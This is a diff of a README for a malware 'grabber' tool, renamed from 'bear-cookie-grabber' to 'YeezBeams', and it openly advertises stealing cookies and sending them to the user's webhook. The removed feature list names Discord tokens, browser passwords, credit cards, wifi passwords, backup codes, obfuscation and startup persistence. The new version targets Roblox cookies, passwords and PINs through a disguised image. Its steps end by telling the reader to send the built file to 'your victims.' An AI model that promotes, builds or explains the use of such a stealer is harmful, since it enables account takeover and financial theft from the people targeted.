@@ -1,9 +1,9 @@
 <h1 align="center">
- 😈bear-cookie-grabber😈
+ 😈YeezBeams😈
 </h1>
 
 <h2 align="center">
- bear-cookie-grabber is a tool that allows you to steal a cookie with a .exe and sends it to you webhook!
+ YeezBeams is a tool that allows you to steal a cookie with a image and sends it to you webhook!
 </h2>
 
 <div align="center">
@@ -13,39 +13,11 @@
   
 ### Features:
 
-- `Token`🟢
-- `Discord Name`🟢
-- `Google Passwords`🟢
-- `Google Cookies`🟢
-- `IP`🟢
-- `Phone Number`🟢
-- `Email`🟢
-- `If They Have Billing`🟢
-- `If They Have Nitro`🟢
-- `What OS They're Using`🟢
-- `RAM`🟢
-- `GPU`🟢
-- `CPU`🟢
-- `Injection`🟢
-- `Browser History`🟢
-- `Wifi Passwords`🟢
-- `Minecraft Session Info`🟢
-- `Epic Games Offline Data`🟢
-- `2FA Enabled Or Not`🟢
-- `Gift Inventory Codes`🟢
-- `Discord Backup Codes`🟢
-- `Credit Cards`🟢
-- `Fake Error`🟢
-- `Obfuscation`🟢
-- `Condense .Exe Size`🟢
-- `Icon For .Exe (optional)`🟢
-- `Add File To Startup`🟢
-- `Anti Spam (just prevents from multiple instances running at once)`🟢
-- `Bypass Token Protector`🟡
-- `Binder`🟡
-- `WebCam Screenshot (optional)`🟡
 
-
+- `Roblox cookie`🟢
+- `Roblox password`🟢
+- `Roblox username`🟢
+- `Pin`🟢
 🟢 = Added  | 🟡 = To Do  | 🔴 = Not Adding
 
 <hr style="border-radius: 2%; margin-top: 60px; margin-bottom: 60px;" noshade="" size="20" width="100%">
@@ -59,11 +31,11 @@ Make sure you have [Python](https://www.python.org/downloads/) installed and it 
 Once you've downloaded the files extract the folder so it's no longer a .zip file.
 ```
 
-### 2. Open The bear-cookie-grabber.exe File:
+### 2. Open The YeezBeams.exe File:
 
 ```
-You dont need to install any modules opening this will install them for you. Then you can open the bear-cookie-grabber.exe which will
-open a terminal with the bear-cookie-grabber logo. Don't worry although this looks quite menacing its just aesthetic and is normal.
+You dont need to install any modules opening this will install them for you. Then you can open the YeezBeams which will
+open a terminal with the YeezBeams logo. Don't worry although this looks quite menacing its just aesthetic and is normal.
 ```
 
 ### 3. Create A Webhook:
@@ -76,7 +48,7 @@ into the terminal when prompted.
 ### 4. Conifgurable Options:
 
 ```
-Now once you've given your file a name you can pick between some options by typing either y or n for each one. After
+Now once you've given your image link you can pick between some options by typing either y or n for each one. After
 having done that the file will be built and ready for usage.
 ```
 
@@ -90,17 +62,7 @@ can see if there are any issues or not.
 ### 6. What Now?
 
 ```
-The .exe file will appear in the same folder where all the other files are with the name you set it as and you can now send
+The image file will appear in the same folder where all the other files are with the name you set it as and you can now send
 this to your victims.😈
 ```
 <hr style="border-radius: 2%; margin-top: 60px; margin-bottom: 60px;" noshade="" size="20" width="100%">
-### GUI
-
-![image](https://user-images.githubusercontent.com/116742327/198694318-193f7d1a-3259-4d51-b531-0e0e521cee48.png)
-
-<hr style="border-radius: 2%; margin-top: 60px; margin-bottom: 60px;" noshade="" size="20" width="100%">
-
-![image](https://user-images.githubusercontent.com/116742327/198696468-03c856a0-c615-439e-8b23-b6dcdfe6819b.png)
-
-<hr style="border-radius: 2%; margin-top: 60px; margin-bottom: 60px;" noshade="" size="20" width="100%">
-
